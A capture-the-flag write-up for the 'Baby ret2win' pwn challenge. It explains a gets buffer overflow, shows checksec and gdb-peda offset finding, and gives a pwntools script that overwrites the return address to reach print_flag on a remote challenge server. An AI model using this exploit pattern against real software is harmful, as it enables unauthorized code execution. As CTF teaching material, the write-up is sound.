# Baby ret2win
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-75-orange)

## Description
```
placeholder - problem hidden
```

## Solution
The `gets` function has a buffer overflow that we can abuse to overwrite the return pointer.

In 64-bit executables, when a function (like `main`) returns, it pops an address off the stack and returns to that address. If we can overwrite it, we can return to the win function.

Checking the security of the binary, it's not positionally independent, so we don't need to leak the address of `print_flag`. It's constant every time.
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ p print_flag
$1 = {<text variable, no debug info>} 0x4011d6 <print_flag>
```

We can use gdb-peda's pattern feature to find the offset we want to overwrite.
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /workspaces/home/lyonctf/babyret2win/babyret2win 
...lots of text...
What is your name?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Hi admin!

Program received signal SIGSEGV, Segmentation fault.
...useless debugging information...
Stopped reason: SIGSEGV
0x0000000000401390 in main ()
gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 48
```

The address we want to overwrite is RBP+8, so we should first write 48+8=56 bytes of junk first. Of course, we also need 8 newlines to skip past the prompts.

```py
from pwn import *

win = 0x4011d6
#     newlines  junk        win address
pay = b'\n'*8 + b'A' * 56 + p64(win)

#p = process('./babyret2win')
p = remote("784acc4.0x16.ink", 32500)
p.sendline(pay)

p.interactive()
```


Flag: `placeholder - problem hidden`
